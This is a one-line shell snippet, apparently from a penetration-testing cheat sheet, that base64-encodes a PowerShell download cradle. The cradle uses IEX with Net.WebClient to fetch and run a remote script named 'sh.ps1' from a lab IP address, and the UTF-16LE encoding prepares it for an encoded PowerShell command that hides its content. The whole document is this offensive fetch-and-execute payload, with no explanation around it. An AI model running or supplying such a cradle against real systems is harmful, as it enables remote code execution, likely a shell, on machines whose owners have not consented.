

```shell
echo -n "powershell -c 'IEX (New-Object Net.WebClient).downloadString(http://192.168.157.131/sh.ps1)" | iconv -f ASCII -t UTF-16LE | base64 | tr -d "\n"
```
